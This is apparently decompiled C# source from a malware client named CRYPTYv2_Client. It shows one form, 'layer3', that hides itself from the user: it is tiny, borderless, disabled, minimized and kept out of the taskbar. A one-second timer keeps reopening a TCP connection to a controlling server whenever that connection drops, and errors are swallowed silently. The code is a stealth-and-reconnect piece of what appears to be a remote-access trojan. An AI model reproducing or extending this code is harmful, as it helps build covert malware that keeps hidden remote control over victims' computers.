using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using CRYPTYv2_Client.My;
using Microsoft.VisualBasic.CompilerServices;

namespace CRYPTYv2_Client;

[DesignerGenerated]
public class layer3 : Form
{
	private IContainer components;

	internal virtual Timer remoteRunning
	{
		[CompilerGenerated]
		get
		{
			return _remoteRunning;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = remoteRunning_Tick;
			Timer val = _remoteRunning;
			if (val != null)
			{
				val.remove_Tick(eventHandler);
			}
			_remoteRunning = value;
			val = _remoteRunning;
			if (val != null)
			{
				val.add_Tick(eventHandler);
			}
		}
	}

	public layer3()
	{
		((Form)this).add_Load((EventHandler)layer3_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		components = new Container();
		remoteRunning = new Timer(components);
		((Control)this).SuspendLayout();
		remoteRunning.set_Enabled(true);
		remoteRunning.set_Interval(1000);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_ControlBox(false);
		((Control)this).set_Enabled(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("layer3");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("L3");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	private void layer3_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		remoteRunning.Start();
		((Control)MyProject.Forms.layer4).Show();
	}

	private void remoteRunning_Tick(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(TCP_Connector.ServerActive(), (object)false, false))
		{
			try
			{
				TCP_Connector.startConnection();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
